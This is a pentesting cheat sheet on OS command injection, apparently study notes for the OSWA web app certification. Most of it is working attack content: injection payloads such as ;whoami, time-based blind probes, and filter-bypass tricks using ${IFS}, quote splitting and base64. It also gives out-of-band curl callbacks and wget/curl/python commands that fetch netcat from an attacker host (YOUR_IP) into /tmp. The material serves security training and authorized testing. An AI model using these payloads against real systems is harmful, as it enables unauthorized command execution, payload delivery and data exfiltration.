---
category: OSWA Web App Pentesting
order: 7
summary: Injection operators, filter bypass techniques, blind/out-of-band detection, and reverse shell one-liners.
---
# Command Injection

## Methodology (3 steps)
1. Confirm injection — visible output, or blind.
2. Determine target OS (Linux/Windows) — changes separators, syntax, shell technique completely.
3. Escalate to an interactive shell.

## Confirm — visible output
```
127.0.0.1;whoami
127.0.0.1|whoami
127.0.0.1`whoami`
127.0.0.1$(whoami)
```

## Confirm — blind, time-based
Baseline the normal response time first, then send a payload that should add N seconds and compare.

Linux (by separator, `sleep` is most reliable):
```
127.0.0.1;sleep 5
127.0.0.1|sleep 5
127.0.0.1&&sleep 5
```
No `sleep`? Fall back to `ping -c 5 127.0.0.1`.

Windows:
```
127.0.0.1&timeout /t 5             # cleanest: real delay, nothing else running
127.0.0.1&ping -n 5 127.0.0.1      # N packets ≈ (N-1) seconds
```

PowerShell context:
```
127.0.0.1; Start-Sleep -Seconds 5
```

## Confirm — blind, write output to a file
```
127.0.0.1;ls -la > /var/www/html/list.txt
```
Then browse to `http://target/list.txt`.

## Confirm — blind, out-of-band (Windows conditional)
```
if exist file.txt (curl http://YOUR_IP:8000/YES) else (curl http://YOUR_IP:8000/NO)
```

## Filter / blocklist bypass
| Blocked | Alternative |
|---|---|
| Common separators (`;`, `\|`, `&&`) | Backticks or `$()` |
| Space | `${IFS}` instead of a space, or a tab (`%09` in a URL) |
| Exact command name (string blocklist) | Null-statement split: `wh$()oami`, `w'h'oami` |
| Any special character | Double URL-encoding, if the app decodes twice |
| Backtick permitted but everything else blocked | Base64: `` ;`echo BASE64_PAYLOAD | base64 -d` `` |

## Enumerating capabilities
Check what's on the box with `which <bin>` before committing to a shell technique:

| Linux | Used for |
|---|---|
| `wget` / `curl` / `fetch` | File transfer |
| `nc` / `socat` | Shells, file transfer, port forwarding |
| `php` / `python` / `python3` / `perl` / `java` | Shells, code execution |

| Windows | Used for |
|---|---|
| `powershell` | Code execution, movement, payload delivery |
| `tftp` / `ftp` / `certutil` | File transfer |
| `ipconfig` / `netstat` / `hostname` / `systeminfo` | Enumeration |

## File transfer (Linux)
```
wget http://YOUR_IP:8000/nc -O /tmp/nc
curl http://YOUR_IP:8000/nc -o /tmp/nc
python3 -c "import urllib.request; urllib.request.urlretrieve('http://YOUR_IP:8000/nc','/tmp/nc')"
```
`chmod +x /tmp/nc` before running it.

## World-writable directories (777)
`/tmp/` · `/var/tmp/` · `/dev/shm/` (RAM-backed — faster, doesn't survive reboot).

## Real troubleshooting gotchas
- URL-encode everything before sending — a raw space or `%` can 400 before your injection is even parsed.
- Recalculate `Content-Length` any time you hand-edit a request body.
- `Address already in use` on `python3 -m http.server` = something else already owns that port.
- Shell not connecting on an unusual port? Try 80/443 — some networks only allow "web-looking" ports outbound.
- Writing a payload to disk never executes it by itself — you always need a second step to run it.

## Reference links
- PayloadsAllTheThings — Command Injection
- OWASP OS Command Injection Defense Cheat Sheet
